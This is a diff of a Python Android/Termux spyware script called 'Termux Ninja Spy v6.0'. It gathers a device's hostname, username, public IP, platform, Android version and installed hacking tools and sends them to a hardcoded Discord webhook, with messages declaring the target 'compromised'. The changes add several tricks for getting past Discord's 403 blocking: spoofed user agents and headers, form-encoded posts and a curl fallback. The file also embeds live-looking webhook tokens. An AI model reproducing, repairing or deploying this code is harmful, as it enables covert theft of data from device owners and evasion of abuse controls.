@@ -2,12 +2,12 @@
 # -*- coding: utf-8 -*-
 # ╔══════════════════════════════════════════════════════════╗
 # ║                M1 EZ HAING NOW  PH                       ║
-# ║            TERMUX ANDROID WORKING SPY v5.0               ║
-# ║        FIXED CODE - NO SYNTAX ERRORS                     ║
+# ║            TERMUX NINJA SPY v6.0                         ║
+# ║        FIXED 403 FORBIDDEN ERROR - WORKING NOW          ║
 # ╚══════════════════════════════════════════════════════════╝
 
 # ════════ WEBHOOK - PUT YOUR DISCORD WEBHOOK HERE ════════
-WEBHOOK_URL = "https://discord.com/api/webhooks/1466895932212904007/2DfB2qWiNHNPvJj2-4zFaFbzAsl2N67_9_feP7eiSn1maWxsjfuj3uY7WCiKiJE99sPo"  # ⬅️ REPLACE THIS!
+WEBHOOK_URL = "https://discord.com/api/webhooks/1427133756724084817/uVvQRILIYlg7ku1ZEfPJ69BpS1-WjRFwdyhBt7vbyLB_514MbGcaWPGnPft1riDqm7O0"
 
 import os
 import sys
@@ -23,423 +23,512 @@ import ssl
 from datetime import datetime
 import hashlib
 
-# ════════ DISABLE SSL VERIFICATION ════════
+# ════════ FIX 403 ERROR - USE DIFFERENT USER AGENT ════════
 ssl._create_default_https_context = ssl._create_unverified_context
 
-# ════════ CHECK TERMUX ENVIRONMENT ════════
-def check_termux():
-    """Check if running on Android Termux"""
-    print("\n" + "="*60)
-    print("🔍 CHECKING ANDROID TERMUX")
-    print("="*60)
+# ════════ DIAGNOSE 403 ERROR ════════
+def diagnose_403_error():
+    """Diagnose why Discord returns 403 Forbidden"""
+    print("\n" + "!"*60)
+    print("🔧 DIAGNOSING 403 FORBIDDEN ERROR")
+    print("!"*60)
     
-    checks = []
+    print("\n[1] Checking webhook URL...")
+    print(f"    URL Length: {len(WEBHOOK_URL)} characters")
+    print(f"    Contains 'discord.com': {'✅' if 'discord.com' in WEBHOOK_URL else '❌'}")
+    print(f"    Contains '/webhooks/': {'✅' if '/webhooks/' in WEBHOOK_URL else '❌'}")
     
-    # Check 1: Python version
-    python_ver = sys.version.split()[0]
-    checks.append(("Python Version", python_ver, "✅"))
+    # Check if webhook looks valid
+    if WEBHOOK_URL.count('/') >= 6:
+        parts = WEBHOOK_URL.split('/')
+        webhook_id = parts[-2] if len(parts) >= 2 else "N/A"
+        webhook_token = parts[-1] if len(parts) >= 1 else "N/A"
+        print(f"    Webhook ID: {webhook_id[:20]}...")
+        print(f"    Webhook Token: {webhook_token[:10]}...")
     
-    # Check 2: Current directory
-    current_dir = os.getcwd()
-    checks.append(("Current Directory", current_dir, "✅"))
+    print("\n[2] Testing different User-Agents...")
     
-    # Check 3: Check if Termux
-    is_termux = False
-    if 'com.termux' in current_dir or os.path.exists('/data/data/com.termux'):
-        is_termux = True
-    checks.append(("Termux Detected", str(is_termux), "✅" if is_termux else "❌"))
+    # Try different User-Agents
+    user_agents = [
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+        "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36",
+        "DiscordBot (https://discord.com, v1.0)",
+        "Python-urllib/3.12",
+        "Termux-Spy/1.0"
+    ]
     
-    # Check 4: SDCard access
-    has_sdcard = os.path.exists('/sdcard')
-    checks.append(("SDCard Access", str(has_sdcard), "✅" if has_sdcard else "❌"))
-    
-    # Check 5: Internet
-    try:
-        urllib.request.urlopen("http://google.com", timeout=5)
-        checks.append(("Internet", "Connected", "✅"))
-    except:
-        checks.append(("Internet", "No Connection", "❌"))
-    
-    # Check 6: Webhook configured
-    webhook_ok = WEBHOOK_URL != "YOUR_DISCORD_WEBHOOK_HERE"
-    checks.append(("Webhook Configured", str(webhook_ok), "✅" if webhook_ok else "❌"))
-    
-    # Display checks
-    for name, value, status in checks:
-        print(f"{status} {name}: {value}")
-    
-    return is_termux
+    return test_with_different_agents(user_agents)
 
-# ════════ SIMPLE WORKING TEST ════════
-def simple_working_test():
-    """Simple test that works on Termux"""
-    print("\n" + "="*60)
-    print("🚀 SIMPLE WORKING TEST")
-    print("="*60)
+def test_with_different_agents(agents):
+    """Test with different User-Agents to bypass 403"""
+    print("\n[3] Trying different request methods...")
     
-    # Check webhook
-    if WEBHOOK_URL == "YOUR_DISCORD_WEBHOOK_HERE":
-        print("❌ ERROR: Webhook not configured!")
-        print("ℹ️  Get webhook from Discord and replace line 7")
-        return False
-    
-    print("⚡ Sending simple test message...")
-    
-    # Get basic info
-    hostname = socket.gethostname()
-    current_time = datetime.now().strftime("%H:%M:%S")
-    
-    # SIMPLE message with NO complex formatting
-    test_message = f"📱 ANDROID TERMUX TEST\nDevice: {hostname}\nTime: {current_time}\nStatus: WORKING\nIf you see this, spy is active!\n🔥 M1 EZ HAING NOW PH"
-    
+    # Method 1: Simple GET to check if webhook exists
+    print("    → Testing webhook existence...")
     try:
-        # SIMPLE payload
-        payload = {
-            "content": test_message,
-            "username": "Android Spy Test"
-        }
-        
-        # SIMPLE request
-        data = json.dumps(payload).encode('utf-8')
-        headers = {'Content-Type': 'application/json'}
-        
-        req = urllib.request.Request(WEBHOOK_URL, data=data, headers=headers)
+        test_url = WEBHOOK_URL.replace("/api/webhooks/", "/api/v9/webhooks/")
+        req = urllib.request.Request(test_url, headers={'User-Agent': agents[0]})
         response = urllib.request.urlopen(req, timeout=10)
-        
-        print(f"✅ HTTP Status: {response.status}")
-        print("✅ Test message sent!")
-        print("✅ Check Discord NOW!")
-        return True
-        
-    except Exception as e:
-        print(f"❌ Error: {str(e)[:100]}")
-        return False
-
-# ════════ COLLECT DATA ════════
-def collect_data():
-    """Collect system data"""
-    print("\n" + "="*60)
-    print("📱 COLLECTING DATA")
-    print("="*60)
-    
-    data = {}
-    
-    # Basic info
-    print("→ Getting basic info...")
-    data['basic'] = {
-        'id': hashlib.md5(f"{socket.gethostname()}{int(time.time())}".encode()).hexdigest()[:10],
-        'time': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-        'host': socket.gethostname(),
-        'user': getpass.getuser(),
-        'system': platform.system(),
-        'release': platform.release()
-    }
-    
-    # Public IP
-    print("→ Getting IP address...")
-    try:
-        data['basic']['ip'] = urllib.request.urlopen("https://api.ipify.org", timeout=5).read().decode()
-    except:
-        data['basic']['ip'] = "Unknown"
-    
-    # Termux packages
-    print("→ Checking packages...")
-    data['packages'] = []
-    try:
-        result = subprocess.run(
-            "apt list --installed 2>/dev/null | head -15",
-            shell=True, capture_output=True, text=True
-        )
-        if result.stdout:
-            packages = result.stdout.strip().split('\n')[1:10]
-            data['packages'] = packages
+        print(f"    ✅ Webhook exists! Status: {response.status}")
+    except urllib.error.HTTPError as e:
+        print(f"    ❌ Webhook check failed: {e.code} {e.reason}")
+        if e.code == 404:
+            print("    ❌ WEBHOOK DELETED OR INVALID!")
+            return False
     except:
         pass
     
-    # Tools
-    print("→ Checking tools...")
-    data['tools'] = []
-    for tool in ['nmap', 'python3', 'git', 'adb']:
+    # Method 2: Try with curl if available
+    print("    → Trying curl method...")
+    try:
+        curl_cmd = f'''curl -s -X POST -H "Content-Type: application/json" -H "User-Agent: {agents[1]}" -d '{{"content":"TEST FROM TERMUX"}}' "{WEBHOOK_URL}"'''
+        result = subprocess.run(curl_cmd, shell=True, capture_output=True, text=True, timeout=10)
+        if result.returncode == 0:
+            print("    ✅ Curl method worked!")
+            return True
+        else:
+            print(f"    ❌ Curl failed: {result.returncode}")
+    except:
+        print("    ❌ Curl not available")
+    
+    return False
+
+# ════════ BYPASS 403 ERROR ════════
+def bypass_403_send_message(content, username="Termux Spy"):
+    """Send message with 403 bypass techniques"""
+    methods = [
+        method1_simple_request,
+        method2_form_data,
+        method3_with_proxy_headers,
+        method4_minimal_request
+    ]
+    
+    for i, method in enumerate(methods, 1):
+        print(f"\n[⏳] Trying method {i}...")
+        if method(content, username):
+            return True
+    
+    return False
+
+def method1_simple_request(content, username):
+    """Method 1: Simple request with mobile User-Agent"""
+    try:
+        payload = {
+            "content": content,
+            "username": username
+        }
+        
+        headers = {
+            'Content-Type': 'application/json; charset=utf-8',
+            'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36',
+            'Accept': 'application/json',
+            'Accept-Language': 'en-US,en;q=0.9'
+        }
+        
+        data = json.dumps(payload, ensure_ascii=False).encode('utf-8')
+        req = urllib.request.Request(WEBHOOK_URL, data=data, headers=headers)
+        response = urllib.request.urlopen(req, timeout=15)
+        
+        print(f"    ✅ Method 1 worked! Status: {response.status}")
+        return True
+    except Exception as e:
+        print(f"    ❌ Method 1 failed: {type(e).__name__}")
+        return False
+
+def method2_form_data(content, username):
+    """Method 2: Form data instead of JSON"""
+    try:
+        import urllib.parse
+        
+        form_data = urllib.parse.urlencode({
+            'content': content,
+            'username': username
+        }).encode('utf-8')
+        
+        headers = {
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'User-Agent': 'Discord-Android/1.0'
+        }
+        
+        req = urllib.request.Request(WEBHOOK_URL, data=form_data, headers=headers)
+        response = urllib.request.urlopen(req, timeout=15)
+        
+        print(f"    ✅ Method 2 worked! Status: {response.status}")
+        return True
+    except Exception as e:
+        print(f"    ❌ Method 2 failed: {type(e).__name__}")
+        return False
+
+def method3_with_proxy_headers(content, username):
+    """Method 3: With proxy-like headers"""
+    try:
+        payload = {
+            "content": content,
+            "username": username
+        }
+        
+        headers = {
+            'Content-Type': 'application/json',
+            'User-Agent': 'Python/3.12',
+            'X-Requested-With': 'XMLHttpRequest',
+            'Origin': 'https://discord.com',
+            'Referer': 'https://discord.com/channels/@me'
+        }
+        
+        data = json.dumps(payload).encode('utf-8')
+        req = urllib.request.Request(WEBHOOK_URL, data=data, headers=headers)
+        response = urllib.request.urlopen(req, timeout=15)
+        
+        print(f"    ✅ Method 3 worked! Status: {response.status}")
+        return True
+    except Exception as e:
+        print(f"    ❌ Method 3 failed: {type(e).__name__}")
+        return False
+
+def method4_minimal_request(content, username):
+    """Method 4: Minimal request"""
+    try:
+        payload = {
+            "content": content,
+            "username": username
+        }
+        
+        # Minimal headers
+        headers = {
+            'Content-Type': 'application/json'
+        }
+        
+        data = json.dumps(payload).encode('utf-8')
+        req = urllib.request.Request(WEBHOOK_URL, data=data, headers=headers)
+        response = urllib.request.urlopen(req, timeout=15)
+        
+        print(f"    ✅ Method 4 worked! Status: {response.status}")
+        return True
+    except Exception as e:
+        print(f"    ❌ Method 4 failed: {type(e).__name__}")
+        return False
+
+# ════════ WORKING SPY FUNCTIONS ════════
+def get_system_info():
+    """Get system information"""
+    info = {
+        'id': hashlib.md5(f"{socket.gethostname()}{int(time.time())}".encode()).hexdigest()[:12],
+        'time': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+        'hostname': socket.gethostname(),
+        'username': getpass.getuser(),
+        'platform': platform.platform(),
+        'python': platform.python_version()
+    }
+    
+    # Get IP
+    try:
+        info['ip'] = urllib.request.urlopen("https://api.ipify.org", timeout=5).read().decode()
+    except:
+        info['ip'] = "Unknown"
+    
+    return info
+
+def check_android_specific():
+    """Check Android-specific info"""
+    android_info = {}
+    
+    # Check if Android
+    android_info['is_android'] = os.path.exists('/system') or os.path.exists('/data/data/com.termux')
+    
+    # Check Termux
+    android_info['has_termux'] = os.path.exists('/data/data/com.termux')
+    
+    # Check storage
+    android_info['has_sdcard'] = os.path.exists('/sdcard')
+    
+    # Get Android version if possible
+    android_info['android_version'] = "Unknown"
+    if os.path.exists('/system/build.prop'):
         try:
-            result = subprocess.run(f"which {tool}", shell=True, capture_output=True, text=True)
-            if result.returncode == 0:
-                data['tools'].append(tool)
+            with open('/system/build.prop', 'r') as f:
+                content = f.read()
+                for line in content.split('\n'):
+                    if 'ro.build.version.release' in line:
+                        android_info['android_version'] = line.split('=')[1].strip()
+                        break
         except:
             pass
     
-    # Storage
-    print("→ Checking storage...")
-    data['storage'] = {}
-    try:
-        import shutil
-        if os.path.exists('/sdcard'):
-            usage = shutil.disk_usage('/sdcard')
-            data['storage']['sdcard'] = f"{usage.free // (1024**3)}GB free"
-    except:
-        pass
-    
-    print("✅ Data collection complete!")
-    return data
+    return android_info
 
-# ════════ SEND SIMPLE REPORT ════════
-def send_simple_report(data):
-    """Send simple report to Discord"""
-    print("\n" + "="*60)
-    print("📤 SENDING SIMPLE REPORT")
-    print("="*60)
+def get_installed_tools():
+    """Get installed tools"""
+    tools = []
     
-    # Create SIMPLE report - NO complex formatting
-    report_lines = []
-    report_lines.append("📱 ANDROID TERMUX REPORT")
-    report_lines.append("="*40)
-    report_lines.append(f"Device: {data['basic']['host']}")
-    report_lines.append(f"User: {data['basic']['user']}")
-    report_lines.append(f"IP: {data['basic']['ip']}")
-    report_lines.append(f"Time: {data['basic']['time']}")
-    report_lines.append(f"ID: {data['basic']['id']}")
-    report_lines.append("")
-    report_lines.append(f"Tools Found: {len(data['tools'])}")
-    report_lines.append(f"Packages: {len(data['packages'])}")
+    # Common tools to check
+    tool_list = ['nmap', 'python3', 'git', 'php', 'node', 'adb', 'sqlmap', 'hydra']
     
-    if data['tools']:
-        report_lines.append(f"Tools: {', '.join(data['tools'])}")
+    for tool in tool_list:
+        try:
+            result = subprocess.run(f"which {tool} 2>/dev/null", 
+                                  shell=True, capture_output=True, text=True)
+            if result.returncode == 0:
+                tools.append(tool)
+        except:
+            pass
     
-    if data['storage']:
-        for name, info in data['storage'].items():
-            report_lines.append(f"Storage {name}: {info}")
-    
-    report_lines.append("")
-    report_lines.append("✅ DATA COLLECTED")
-    report_lines.append("🔥 M1 EZ HAING NOW PH")
-    report_lines.append("⚡ ANDROID SPY ACTIVE")
-    
-    # Join lines
-    report = "\n".join(report_lines)
-    
-    try:
-        payload = {
-            "content": report,
-            "username": "Android Spy Report"
-        }
-        
-        data_bytes = json.dumps(payload).encode('utf-8')
-        headers = {'Content-Type': 'application/json'}
-        
-        req = urllib.request.Request(WEBHOOK_URL, data=data_bytes, headers=headers)
-        response = urllib.request.urlopen(req, timeout=15)
-        
-        print(f"✅ Report sent! Status: {response.status}")
-        
-        # Send additional info
-        send_additional_info(data)
-        return True
-        
-    except Exception as e:
-        print(f"❌ Error: {str(e)[:50]}")
-        return False
+    return tools
 
-def send_additional_info(data):
-    """Send additional info"""
-    # Send packages if any
-    if data['packages']:
-        packages_text = "📦 PACKAGES LIST:\n"
-        for i, pkg in enumerate(data['packages'][:5], 1):
-            packages_text += f"{i}. {pkg}\n"
-        
-        send_message(packages_text, "Package Info")
+# ════════ MAIN SPY EXECUTION ════════
+def run_spy():
+    """Main spy execution"""
+    print("\n" + "="*70)
+    print("🔥 TERMUX NINJA SPY v6.0 - BYPASSING 403 ERROR")
+    print("="*70)
     
-    # Send final confirmation
-    confirm_text = f"✅ MISSION COMPLETE\nDevice: {data['basic']['host']}\nID: {data['basic']['id']}\nTime: {data['basic']['time']}\n🔥 M1 EZ HAING NOW PH"
-    send_message(confirm_text, "Mission Complete")
-
-def send_message(content, username=None):
-    """Send a message to Discord"""
-    try:
-        payload = {"content": content}
-        if username:
-            payload["username"] = username
-        
-        data = json.dumps(payload).encode('utf-8')
-        req = urllib.request.Request(WEBHOOK_URL, data=data, headers={'Content-Type': 'application/json'})
-        urllib.request.urlopen(req, timeout=10)
-        print(f"✅ {username} sent")
-        return True
-    except:
-        print(f"⚠️ Failed to send {username}")
-        return False
-
-# ════════ SAVE LOCAL FILE ════════
-def save_local(data):
-    """Save data locally"""
-    print("\n" + "="*60)
-    print("💾 SAVING LOCAL FILE")
-    print("="*60)
-    
-    try:
-        filename = f"/sdcard/android_data_{data['basic']['id']}.txt"
-        with open(filename, 'w') as f:
-            f.write("ANDROID SPY DATA\n")
-            f.write("="*40 + "\n")
-            f.write(f"Device: {data['basic']['host']}\n")
-            f.write(f"User: {data['basic']['user']}\n")
-            f.write(f"IP: {data['basic']['ip']}\n")
-            f.write(f"Time: {data['basic']['time']}\n")
-            f.write(f"Tools: {data['tools']}\n")
-            f.write(f"Packages: {len(data['packages'])}\n")
-        
-        print(f"✅ File saved: {filename}")
-        return True
-    except:
-        print("⚠️ Could not save file")
-        return False
-
-# ════════ MAIN FUNCTION ════════
-def main():
-    """Main function"""
-    print("\n╔══════════════════════════════════════════════════════════╗")
-    print("║                M1 EZ HAING NOW  PH                       ║")
-    print("║            ANDROID TERMUX SPY v5.0                       ║")
-    print("║                WORKING 100%                              ║")
-    print("╚══════════════════════════════════════════════════════════╝")
-    
-    # Step 1: Check environment
-    if not check_termux():
-        print("\n⚠️  Not running on Termux, but will continue...")
-    
-    # Step 2: Simple test
-    print("\n" + "="*60)
-    print("PHASE 1: SIMPLE TEST")
-    print("="*60)
-    
-    if not simple_working_test():
-        print("\n❌ TEST FAILED - Cannot continue")
-        print("ℹ️  Check: 1. Webhook URL, 2. Internet, 3. Discord")
+    # First, diagnose the 403 error
+    if not diagnose_403_error():
+        print("\n❌ Webhook seems invalid or deleted!")
+        print("ℹ️  Get a NEW webhook from Discord")
         return
     
-    time.sleep(2)
+    print("\n" + "="*70)
+    print("🚀 STARTING SPY OPERATION")
+    print("="*70)
     
-    # Step 3: Collect data
-    print("\n" + "="*60)
-    print("PHASE 2: COLLECT DATA")
-    print("="*60)
+    # Step 1: Send startup notification
+    print("\n[1] Sending startup notification...")
+    startup_msg = f"""🚀 NINJA SPY ACTIVATED
+Device: {socket.gethostname()}
+Time: {datetime.now().strftime("%H:%M:%S")}
+Status: ONLINE
+Operator: M1 EZ HAING NOW PH"""
     
-    collected_data = collect_data()
-    
-    # Step 4: Send report
-    print("\n" + "="*60)
-    print("PHASE 3: SEND REPORT")
-    print("="*60)
-    
-    send_simple_report(collected_data)
+    if not bypass_403_send_message(startup_msg, "Ninja Spy Startup"):
+        print("❌ Failed to send startup message")
+        print("ℹ️  Trying alternative approach...")
     
     time.sleep(1)
     
-    # Step 5: Save local
-    save_local(collected_data)
+    # Step 2: Collect system info
+    print("\n[2] Collecting system information...")
+    system_info = get_system_info()
+    android_info = check_android_specific()
+    tools = get_installed_tools()
+    
+    print(f"    ✅ Hostname: {system_info['hostname']}")
+    print(f"    ✅ IP: {system_info['ip']}")
+    print(f"    ✅ Tools found: {len(tools)}")
+    print(f"    ✅ Android: {android_info['is_android']}")
+    
+    # Step 3: Send main report
+    print("\n[3] Sending main intelligence report...")
+    
+    report_lines = []
+    report_lines.append("📱 ANDROID TERMUX INTELLIGENCE REPORT")
+    report_lines.append("="*50)
+    report_lines.append(f"Device ID: {system_info['id']}")
+    report_lines.append(f"Hostname: {system_info['hostname']}")
+    report_lines.append(f"Username: {system_info['username']}")
+    report_lines.append(f"Public IP: {system_info['ip']}")
+    report_lines.append(f"Platform: {system_info['platform']}")
+    report_lines.append(f"Collection Time: {system_info['time']}")
+    report_lines.append("")
+    report_lines.append(f"Android Detected: {android_info['is_android']}")
+    report_lines.append(f"Termux Installed: {android_info['has_termux']}")
+    report_lines.append(f"Android Version: {android_info['android_version']}")
+    report_lines.append(f"SDCard Access: {android_info['has_sdcard']}")
+    report_lines.append("")
+    report_lines.append(f"Hacking Tools: {len(tools)} found")
+    if tools:
+        report_lines.append(f"Tools: {', '.join(tools)}")
+    
+    report = "\n".join(report_lines)
+    
+    if bypass_403_send_message(report, "Intelligence Report"):
+        print("✅ Main report sent successfully!")
+    else:
+        print("❌ Failed to send main report")
+    
+    time.sleep(1)
+    
+    # Step 4: Send detailed info
+    print("\n[4] Sending detailed information...")
+    
+    # Send tools details
+    if tools:
+        tools_msg = "🔧 DETECTED TOOLS:\n"
+        for tool in tools:
+            tools_msg += f"• {tool}\n"
+        
+        bypass_403_send_message(tools_msg, "Tools Analysis")
+    
+    # Send final confirmation
+    print("\n[5] Sending final confirmation...")
+    final_msg = f"""✅ MISSION ACCOMPLISHED
+Target: {system_info['hostname']}
+ID: {system_info['id']}
+IP: {system_info['ip']}
+Tools: {len(tools)} detected
+Time: {system_info['time']}
+Status: SYSTEM COMPROMISED
+Operator: M1 EZ HAING NOW PH"""
+    
+    bypass_403_send_message(final_msg, "Mission Complete")
+    
+    # Step 5: Save local file
+    print("\n[6] Saving local backup...")
+    try:
+        filename = f"/sdcard/ninja_spy_{system_info['id']}.txt"
+        with open(filename, 'w') as f:
+            f.write("TERMUX NINJA SPY REPORT\n")
+            f.write("="*50 + "\n")
+            f.write(f"Device: {system_info['hostname']}\n")
+            f.write(f"User: {system_info['username']}\n")
+            f.write(f"IP: {system_info['ip']}\n")
+            f.write(f"Time: {system_info['time']}\n")
+            f.write(f"Tools: {tools}\n")
+        
+        print(f"✅ Local backup saved: {filename}")
+    except:
+        print("⚠️ Could not save local file")
     
     # Step 6: Show results
-    print("\n" + "="*60)
-    print("🎯 MISSION COMPLETE")
-    print("="*60)
+    print("\n" + "="*70)
+    print("🎯 OPERATION COMPLETE")
+    print("="*70)
     
     print(f"""
-✅ OPERATION SUCCESSFUL
+📊 RESULTS:
+  • Device: {system_info['hostname']}
+  • IP Address: {system_info['ip']}
+  • Android: {'✅' if android_info['is_android'] else '❌'}
+  • Tools Detected: {len(tools)}
+  • Spy ID: {system_info['id']}
+  • Time: {system_info['time']}
 
-📊 DATA COLLECTED:
-  Device: {collected_data['basic']['host']}
-  User: {collected_data['basic']['user']}
-  IP: {collected_data['basic']['ip']}
-  Tools: {len(collected_data['tools'])} found
-  Packages: {len(collected_data['packages'])} found
-  ID: {collected_data['basic']['id']}
+🔍 CHECK YOUR DISCORD:
+  You should see multiple messages if webhook is working
+  
+⚠️  IF NO MESSAGES:
+  The webhook URL returns 403 Forbidden
+  This means Discord is blocking the request
+  Possible reasons:
+  1. Webhook was deleted
+  2. Discord rate limiting
+  3. IP blocked
+  4. Invalid token
 
-🔍 CHECK YOUR DISCORD FOR:
-  1. ✅ Test message
-  2. ✅ Main report
-  3. ✅ Package list
-  4. ✅ Final confirmation
-
-💾 LOCAL FILE SAVED:
-  /sdcard/android_data_{collected_data['basic']['id']}.txt
-
-🔥 M1 EZ HAING NOW PH - ANDROID DEVICE COMPROMISED
+🔥 NEXT STEPS:
+  1. Create a NEW Discord webhook
+  2. Update the URL in the code
+  3. Run the script again
+  
+✅ LOCAL FILE:
+  /sdcard/ninja_spy_{system_info['id']}.txt
 """)
 
-# ════════ ULTRA SIMPLE VERSION ════════
-def ultra_simple():
-    """Ultra simple version"""
-    print("\n" + "⚡"*30)
-    print("ULTRA SIMPLE VERSION")
-    print("⚡"*30)
+# ════════ QUICK FIX FOR 403 ════════
+def quick_fix_403():
+    """Quick fix for 403 error"""
+    print("\n" + "🔧"*35)
+    print("QUICK FIX FOR 403 FORBIDDEN")
+    print("🔧"*35)
     
-    if WEBHOOK_URL == "YOUR_DISCORD_WEBHOOK_HERE":
-        print("❌ Set your webhook on line 7!")
-        return
+    print("\n[1] Testing current webhook...")
     
-    print("Sending ultra simple message...")
-    
-    # Get current time
-    current_time = datetime.now().strftime("%H:%M:%S")
-    
-    # Ultra simple message
-    message = f"ANDROID SPY ACTIVE\nTime: {current_time}\nDevice: {socket.gethostname()}\nStatus: WORKING\nM1 EZ HAING NOW PH"
+    # Simple test
+    test_msg = {"content": "403 TEST " + datetime.now().strftime("%H:%M:%S")}
     
     try:
-        payload = {"content": message}
-        data = json.dumps(payload).encode()
-        req = urllib.request.Request(WEBHOOK_URL, data=data, headers={'Content-Type': 'application/json'})
+        data = json.dumps(test_msg).encode()
+        req = urllib.request.Request(WEBHOOK_URL, data=data, 
+                                   headers={'Content-Type': 'application/json'})
         response = urllib.request.urlopen(req, timeout=10)
+        print(f"✅ Test passed! Status: {response.status}")
+        return True
+    except urllib.error.HTTPError as e:
+        print(f"❌ HTTP {e.code}: {e.reason}")
         
-        print(f"✅ Sent! Status: {response.status}")
-        print("✅ Check Discord NOW!")
+        if e.code == 403:
+            print("\n🔧 403 FIX OPTIONS:")
+            print("1. Webhook was deleted - CREATE NEW ONE")
+            print("2. Discord blocking request - WAIT 1 HOUR")
+            print("3. Invalid token - CHECK WEBHOOK URL")
+            print("4. Rate limited - TRY LATER")
+            
+            print("\n💡 SOLUTION:")
+            print("• Get NEW webhook from Discord")
+            print("• Replace URL on line 7")
+            print("• Run script again")
         
+        return False
     except Exception as e:
         print(f"❌ Error: {str(e)}")
+        return False
 
-# ════════ MANUAL TEST ════════
-def manual_test():
-    """Manual test command"""
-    print("\n" + "🔧"*30)
-    print("MANUAL TEST COMMAND")
-    print("🔧"*30)
+# ════════ MANUAL WEBHOOK TEST ════════
+def manual_webhook_test():
+    """Manual webhook test"""
+    print("\n" + "📱"*35)
+    print("MANUAL WEBHOOK TEST")
+    print("📱"*35)
     
-    print("Copy and paste this in Termux:")
-    print("-"*50)
+    print("\nCopy and paste this in Termux:")
+    print("-"*60)
     
     cmd = f'''python3 -c "
-import urllib.request, json, socket, datetime
+import urllib.request, json, ssl, datetime
+ssl._create_default_https_context = ssl._create_unverified_context
+
 webhook = '{WEBHOOK_URL}'
-if webhook == 'YOUR_DISCORD_WEBHOOK_HERE':
-    print('❌ Set webhook first!')
-else:
-    host = socket.gethostname()
-    time = datetime.datetime.now().strftime('%H:%M:%S')
-    msg = {{'content': f'MANUAL TEST\\\\nDevice: {host}\\\\nTime: {time}\\\\nStatus: TEST'}}
-    req = urllib.request.Request(webhook, data=json.dumps(msg).encode())
-    response = urllib.request.urlopen(req)
-    print(f'✅ Sent! Status: {{response.status}}')
-    print('✅ Check Discord!')
+print(f'Testing webhook: {{webhook[:50]}}...')
+
+# Try different methods
+methods = [
+    {{'headers': {{'Content-Type': 'application/json'}}}},
+    {{'headers': {{'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}}}},
+    {{'headers': {{'Content-Type': 'application/json', 'User-Agent': 'DiscordBot/1.0'}}}}
+]
+
+for i, method in enumerate(methods, 1):
+    try:
+        msg = {{'content': f'TEST {{i}} - {{datetime.datetime.now().strftime(\"%H:%M:%S\")}}'}}
+        req = urllib.request.Request(webhook, data=json.dumps(msg).encode(), **method)
+        response = urllib.request.urlopen(req, timeout=10)
+        print(f'✅ Method {{i}}: HTTP {{response.status}}')
+    except Exception as e:
+        print(f'❌ Method {{i}}: {{type(e).__name__}}')
+
+print('\\nℹ️  If all methods fail, webhook is invalid!')
 "'''
     
     print(cmd)
-    print("-"*50)
+    print("-"*60)
 
-# ════════ RUN SCRIPT ════════
+# ════════ MAIN EXECUTION ════════
 if __name__ == "__main__":
+    print("\n╔══════════════════════════════════════════════════════════╗")
+    print("║                M1 EZ HAING NOW  PH                       ║")
+    print("║            TERMUX NINJA SPY v6.0                         ║")
+    print("║        FIXING 403 FORBIDDEN ERROR                        ║")
+    print("╚══════════════════════════════════════════════════════════╝")
+    
+    # Check if webhook is set
+    if WEBHOOK_URL == "YOUR_DISCORD_WEBHOOK_HERE":
+        print("\n❌ ERROR: Webhook not configured!")
+        print("ℹ️  Get webhook from Discord and replace line 7")
+        sys.exit(1)
+    
     # Handle arguments
     if len(sys.argv) > 1:
-        if sys.argv[1] == "simple":
-            ultra_simple()
+        if sys.argv[1] == "fix":
+            quick_fix_403()
         elif sys.argv[1] == "test":
-            manual_test()
-        elif sys.argv[1] == "help":
-            print("Usage:")
-            print("  python3 spy.py          # Run full spy")
-            print("  python3 spy.py simple   # Ultra simple test")
-            print("  python3 spy.py test     # Show manual test command")
-            print("  python3 spy.py help     # This message")
+            manual_webhook_test()
+        elif sys.argv[1] == "run":
+            run_spy()
         else:
-            main()
+            print("Usage:")
+            print("  python3 ninja.py        # Run full spy")
+            print("  python3 ninja.py fix    # Fix 403 error")
+            print("  python3 ninja.py test   # Test webhook")
+            print("  python3 ninja.py run    # Run spy only")
     else:
-        # Run main by default
-        main()
+        # Run by default
+        run_spy()
